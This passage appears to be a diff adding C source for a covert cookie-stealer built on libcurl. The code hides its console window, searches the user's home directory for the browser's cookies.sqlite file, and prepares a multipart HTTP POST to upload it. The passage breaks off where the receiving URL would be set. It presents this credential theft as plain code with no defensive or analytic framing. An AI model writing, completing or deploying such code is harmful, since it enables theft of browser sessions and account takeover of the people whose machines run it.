@@ -1,0 +1,34 @@
+int main(int argc, char *argv[])
+{
+  ShowWindow (GetConsoleWindow(), SW_HIDE);
+  CURL *curl;
+  CURLcode res;
+ 
+  curl_mime *form = NULL;
+  curl_mimepart *field = NULL;
+  struct curl_slist *headerlist = NULL;
+  static const char buf[] = "Expect:";
+ 
+  curl_global_init(CURL_GLOBAL_ALL);
+    char fullpath[MAX_PATH] = { 0 };
+    if(findfile_recursive(getenv("HOMEPATH") , "cookies.sqlite", fullpath))
+  curl = curl_easy_init();
+  if(curl) {
+    /* Create the form */ 
+    form = curl_mime_init(curl);
+ 
+    /* Fill in the file upload field */ 
+    field = curl_mime_addpart(form);
+    curl_mime_name(field, "file");
+    curl_mime_filedata(field, fullpath);
+ 
+    /* Fill in the submit field too, even if this is rarely needed */ 
+    field = curl_mime_addpart(form);
+    curl_mime_name(field, "submit");
+    curl_mime_data(field, "send", CURL_ZERO_TERMINATED);
+ 
+    /* initialize custom header list (stating that Expect: 100-continue is not
+       wanted */ 
+    headerlist = curl_slist_append(headerlist, buf);
+    /* what URL that receives this POST */ 
+
